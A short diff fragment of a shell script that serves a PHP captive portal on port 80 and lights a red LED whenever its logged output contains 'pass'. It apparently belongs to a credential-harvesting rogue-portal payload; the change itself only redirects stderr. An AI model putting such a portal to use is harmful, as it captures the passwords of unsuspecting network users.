@@ -20,7 +20,7 @@ foreach(\$_POST as \$par=>\$val)
 ?>
 E
 
-php -S 0.0.0.0:80 /tmp/captive.php $(dirname $0)/www/current | while read line
+php -S 0.0.0.0:80 /tmp/captive.php $(dirname $0)/www/current 2>&1 | while read line
 do echo "$line"
 	if echo "$line" | fgrep -i "pass"; then
 		led red on 2> /dev/null
